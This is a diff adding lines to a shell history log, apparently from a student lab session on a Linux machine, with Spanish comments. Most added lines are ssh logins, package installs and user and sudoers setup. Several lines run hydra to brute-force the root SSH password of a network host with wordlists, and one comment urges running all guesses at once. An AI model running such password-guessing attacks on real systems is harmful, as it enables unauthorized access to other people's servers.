@@ -35,4 +35,67 @@
    35  sudo ssh may@10.1.213.68
    36  ws
    37  clear
-   38  history
+   38  ping proyecta.utch.edu.mx
+   39  sudo ssh root@10.60.137.247
+   40  nano proyecta.txt
+   41  hydra -l root -P proyecta.txt ssh://10.60.137.247
+   42  ls
+   43  hydra -l root -P ../password.txt ssh://10.60.137.247
+   44  clear
+   45  cd ..
+   46  hydra -l root -P proyecta.txt -t 1 -W 5 ssh://10.60.137.247
+   47  hydra -l root -P ../proyecta.txt -t 1 -W 5 ssh://10.60.137.247
+   48  cd Escritorio
+   49  hydra -l root -P proyecta.txt -t 1 -W 5 ssh://10.60.137.247
+   50  nano proyecta.txt
+   51  xclear
+   52  clear
+   53  hydra -l root -P proyecta.txt -t 2 -W 5 ssh://10.60.137.247
+   54  ponle q haga todos los intentos a la vez alv sin miedo al exito y ponle 10 mil contraseÑas
+   55  va a estar dificil xd
+   56  clear
+   57  history
+   58  cd ..
+   59  mkdir ds11_estuvo_aqui
+   60  clear
+   61  man ssh-keygen
+   62  history ds.txt
+   63  man history
+   64  history
+   65  clear
+   66  sudo ssh-copy-id may@10.1.213.68
+   67  sudo  may@10.1.213.68
+   68  sudo ssh  may@10.1.213.68
+   69  histoy
+   70  history
+   71  ls -l
+   72  clear
+   73  ls 'l
+   74
+   75  ;
+   76  -l
+   77  quit
+   78  ls -l
+   79  sudo nano password.txt
+   80  ls -l
+   81  cd ds11_estuvo_aqui/
+   82  touch contraseÑas.txt
+   83  sudo nano contraseÑas.txt
+   84  ip add
+   85  sudo apt install openssh
+   86  sudo apt install ssh
+   87  sudo apt install cmatrix
+   88  clear
+   89  clear history
+   90  exit
+   91  visudo
+   92  sudo visudo
+   93  sudo adduser ds11m
+   94  sudo visudo
+   95  logout
+   96  sudo ds11
+   97  su ds11
+   98  su ds11m
+   99  history
+  100  exit
+  101  history
